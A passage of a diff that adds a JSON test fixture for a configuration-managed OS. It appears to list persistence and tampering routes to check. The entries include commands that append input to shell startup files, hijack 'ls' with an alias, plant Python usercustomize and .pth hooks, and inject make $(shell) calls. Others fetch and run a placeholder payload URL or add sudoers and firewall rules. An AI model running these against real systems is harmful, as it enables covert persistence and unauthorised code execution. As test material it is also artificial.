+     }
+    }
+   },
+   "autostart": {
+    "unsupported": "no desktop and no autostart facility: COMMON decisions (the system boots into a terminal)"
+   },
+   "editor rc": {
+    "unsupported": "no editor in the 0.67 base (base.conf names none; EXECUTORS.md)"
+   },
+   "executable alias": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "printf \"alias ls='. @HOME@/case-input'\\n\" >> @HOME@/.bashrc; true",
+      "role": "user"
+     }
+    }
+   },
+   "hook directory": {
+    "unsupported": "no hook directory is read by any program of the 0.67 base (EXECUTORS.md); a package manager with hooks does not exist"
+   },
+   "installer pre-invoke": {
+    "unsupported": "no installer with pre-invoke hooks in 0.67 (FORMAT.md: packages run nothing at installation)"
+   },
+   "login profile": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "cat @HOME@/case-input >> @HOME@/.profile; cat @HOME@/case-input >> @HOME@/.bash_profile; true",
+      "role": "user"
+     }
+    }
+   },
+   "logout": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "cat @HOME@/case-input >> @HOME@/.bash_logout; true",
+      "role": "user"
+     }
+    }
+   },
+   "plugin directory": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "d=@HOME@/.local/lib/python3.13/site-packages && mkdir -p $d && cp @HOME@/case-input.py $d/usercustomize.py; true",
+      "role": "user"
+     }
+    }
+   },
+   "plugin setting": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "d=@HOME@/.local/lib/python3.13/site-packages && mkdir -p $d && printf \"import os; open(os.environ['CASE_MARKER'], 'w').write('executed')\\n\" > $d/case.pth; true",
+      "role": "user"
+     }
+    }
+   },
+   "saved macro home": {
+    "note": "MAKEFILES names makefiles read by every make run",
+    "steps": {
+     "attempt": {
+      "command": "printf \"x := \\$(shell . @HOME@/case-input)\\n\" > @HOME@/case.mk; true",
+      "role": "user"
+     }
+    }
+   },
+   "saved macro tmp": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "printf \"x := \\$(shell . @HOME@/case-input)\\n\" > /tmp/case.mk; true",
+      "role": "user"
+     }
+    }
+   },
+   "shell rc": {
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "cat @HOME@/case-input >> @HOME@/.bashrc; true",
+      "role": "user"
+     }
+    }
+   }
+  },
+  "G-STDIN": {
+   "cat file | shell": {
+    "note": "the case command as written",
+    "steps": {}
+   },
+   "saved stdin file is a direct route: G-SCRIPT": {
+    "covered_by": "G-SCRIPT variant \"shell redirected file\""
+   },
+   "typed command substitution": {
+    "steps": {
+     "pipe": {
+      "command": "@SH@ -c \"$(cat @HOME@/case-input)\"",
+      "role": "user"
+     }
+    }
+   }
+  },
+  "G-SYSCTL": {
+   "kernel setting": {
+    "effect": "[ \"$(cat /proc/sys/net/ipv4/ip_forward)\" = 1 ]",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "sysctl -w net.ipv4.ip_forward=1",
+      "role": "root"
+     }
+    }
+   }
+  },
+  "G-TIME": {
+   "timezone": {
+    "effect": "readlink /etc/localtime | grep -q \"Etc/GMT-5$\"",
+    "note": "",
+    "steps": {
+     "attempt": {
+      "command": "ln -sf /usr/share/zoneinfo/Etc/GMT-5 /etc/localtime",
+      "role": "root"
+     }
+    }
+   }
+  },
+  "G-UPDATER": {
+   "download cache then install": {
+    "steps": {
+     "attempt": {
+      "command": "mkdir -p @HOME@/.cache/case && case-probe fetch-install @PAYLOAD_URL@ @HOME@/.cache/case/case-child && mkdir -p @HOME@/.local/bin && cp @HOME@/.cache/case/case-child @HOME@/.local/bin/case-child && chmod +x @HOME@/.local/bin/case-child",
+      "role": "user"
+     }
+    }
+   },
+   "fetch-and-execute": {
+    "steps": {
+     "attempt": {
+      "command": "case-probe fetch-install @PAYLOAD_URL@ @HOME@/.local/bin/case-child; @HOME@/.local/bin/case-child",
+      "role": "user"
+     }
+    }
+   },
+   "project directory": {
+    "steps": {
+     "attempt": {
+      "command": "mkdir -p @HOME@/project/bin && case-probe fetch-install @PAYLOAD_URL@ @HOME@/project/bin/case-child",
+      "role": "user"
+     }
+    }
+   },
+   "root global prefix": {
+    "steps": {
+     "attempt": {
+      "command": "case-probe fetch-install @PAYLOAD_URL@ /usr/local/bin/case-child",
+      "role": "root"
+     }
+    }
+   },
+   "self-update": {
+    "note": "the self-update step of the case",
+    "steps": {}
+   },
+   "user local prefix": {
+    "note": "the case commands as written",
+    "steps": {}
+   }
+  }
+ },
+ "xrec": {
+  "account": {
+   "add": "useradd -m case-rec",
+   "effect": "grep -q \"^case-rec:\" /etc/passwd",
+   "record_add": {
+    "lines": [
+     "account case-rec 1201 1201 - /bin/bash @HOME_ROOT@/case-rec"
+    ]
+   },
+   "record_remove": {
+    "remove_lines": [
+     "account case-rec 1201 1201 - /bin/bash @HOME_ROOT@/case-rec"
+    ]
+   },
+   "remove": "userdel case-rec"
+  },
+  "account-change": {
+   "add": "usermod -s /bin/sh user",
+   "effect": "[ \"$(grep \"^user:\" /etc/passwd | cut -d: -f7)\" = /bin/sh ]",
+   "record_add": {
+    "lines": [
+     "account user 1000 1000 users /bin/sh /home/user"
+    ],
+    "remove_lines": [
+     "account user 1000 1000 users /bin/bash /home/user"
+    ]
+   },
+   "record_remove": {
+    "lines": [
+     "account user 1000 1000 users /bin/bash /home/user"
+    ],
+    "remove_lines": [
+     "account user 1000 1000 users /bin/sh /home/user"
+    ]
+   },
+   "remove": "usermod -s /bin/bash user"
+  },
+  "firewall": {
+   "add": "nft add rule inet confos input tcp dport 4445 accept",
+   "effect": "o=$(confos rules 2>&1) || exit 3; printf \"%s\" \"$o\" | grep -q \"dport 4445\"",
+   "record_add": {
+    "lines": [
+     "rule case-rec 'add rule inet confos input tcp dport 4445 accept'"
+    ]
+   },
+   "record_remove": {
+    "remove_lines": [
+     "rule case-rec 'add rule inet confos input tcp dport 4445 accept'"
+    ]
+   },
+   "remove": "nft flush chain inet confos input"
+  },
+  "group": {
+   "add": "groupadd case-rec",
+   "effect": "grep -q \"^case-rec:\" /etc/group",
+   "record_add": {
+    "lines": [
+     "group case-rec 1301"
+    ]
+   },
+   "record_remove": {
+    "remove_lines": [
+     "group case-rec 1301"
+    ]
+   },
+   "remove": "groupdel case-rec"
+  },
+  "hostname": {
+   "add": "hostname case-rec",
+   "effect": "[ \"$(hostname)\" = case-rec ]",
+   "record_add": {
+    "lines": [
+     "setting hostname case-rec"
+    ],
+    "remove_lines": [
+     "setting hostname case-test"
+    ]
+   },
+   "record_remove": {
+    "lines": [
+     "setting hostname case-test"
+    ],
+    "remove_lines": [
+     "setting hostname case-rec"
+    ]
+   },
+   "remove": "hostname case-test"
+  },
+  "linger": {
+   "unsupported": "INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.67 has no service manager tool, no per-user session manager"
+  },
+  "locale": {
+   "add": null,
+   "effect": "grep -q \"^LANG=en_US.UTF-8\" /etc/locale.conf",
+   "record_add": {
+    "lines": [
+     "setting locale en_US.UTF-8"
+    ]
+   },
+   "record_remove": {
+    "remove_lines": [
+     "setting locale en_US.UTF-8"
+    ]
+   },
+   "remove": null
+  },
+  "module": {
+   "unsupported": "INTERFACE 5: loadable kernel modules: none"
+  },
+  "package": {
+   "add": "case_fetch @SERVER@/case-small-2.confpkg /root/case-small-2.confpkg && confpkg install --root / /root/case-small-2.confpkg",
+   "effect": "case-small 2>/dev/null | grep -q \"case-small 2\"",
+   "record_add": {
+    "replaces_package": "case-small",
+    "slot": "small-v2"
+   },
+   "record_remove": {
+    "replaces_package": "case-small",
+    "slot": "small-v1"
+   },
+   "remove": null
+  },
+  "package-file": {
+   "add": "case_fetch @SERVER@/case-small-2.confpkg /root/case-small-2.confpkg && confpkg install /root/case-small-2.confpkg",
+   "effect": "case-small 2>/dev/null | grep -q \"case-small 2\"",
+   "record_add": {
+    "replaces_package": "case-small",
+    "slot": "small-v2"
+   },
+   "record_remove": {
+    "replaces_package": "case-small",
+    "slot": "small-v1"
+   },
+   "remove": null
+  },
+  "rights": {
+   "add": "printf \"%s\\n\" \"user ALL=(root) NOPASSWD: /usr/bin/date\" | tee /etc/sudoers.d/case-rec",
+   "effect": "test -e /etc/sudoers.d/case-rec",
+   "record_add": {
+    "inputs": {
+     "case-rec.sudoers": "payloads/case-rec.sudoers"
+    },
+    "lines": [
+     "file /etc/sudoers.d/case-rec 0440 0:0 @SHA:case-rec.sudoers@ case-rec.sudoers"
+    ]
+   },
+   "record_remove": {
+    "remove_lines": [
+     "file /etc/sudoers.d/case-rec 0440 0:0 @SHA:case-rec.sudoers@ case-rec.sudoers"
+    ]
+   },
+   "remove": "rm -f /etc/sudoers.d/case-rec"
+  },
+  "service": {
+   "add": null,
+   "effect": "s=$(confos services) || exit 3; printf \"%s\\n\" \"$s\" | grep -q \"^case-rec\"",
+   "record_add": {
+    "lines": [
+     "service case-rec enabled /usr/bin/case-probe listen 7074"
+    ]
+   },
+   "record_remove": {
+    "remove_lines": [
+     "service case-rec enabled /usr/bin/case-probe listen 7074"
+    ]
+   },
+   "remove": null
+  },
+  "sysctl": {
+   "add": "sysctl -w net.ipv4.ip_forward=1",
+   "effect": "[ \"$(cat /proc/sys/net/ipv4/ip_forward)\" = 1 ]",
+   "record_add": {
+    "lines": [
+     "setting sysctl:net.ipv4.ip_forward 1"
+    ]
+   },
+   "record_remove": {
+    "remove_lines": [
+     "setting sysctl:net.ipv4.ip_forward 1"
+    ]
+   },
+   "remove": "sysctl -w net.ipv4.ip_forward=0"
+  },
+  "timezone": {
+   "add": "ln -sf /usr/share/zoneinfo/Etc/GMT-4 /etc/localtime",
+   "effect": "readlink /etc/localtime | grep -q \"Etc/GMT-4$\"",
+   "record_add": {
+    "lines": [
+     "setting timezone Etc/GMT-4"
+    ],
+    "remove_lines": [
+     "setting timezone Etc/GMT-3"
+    ]
+   },
+   "record_remove": {
+    "lines": [
+     "setting timezone Etc/GMT-3"
+    ],
+    "remove_lines": [
+     "setting timezone Etc/GMT-4"
+    ]
+   },
+   "remove": "ln -sf /usr/share/zoneinfo/Etc/GMT-3 /etc/localtime"
+  },
+  "user-service": {
+   "unsupported": "INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.67 has no service manager tool, no per-user services"
+  }
+ }
+}
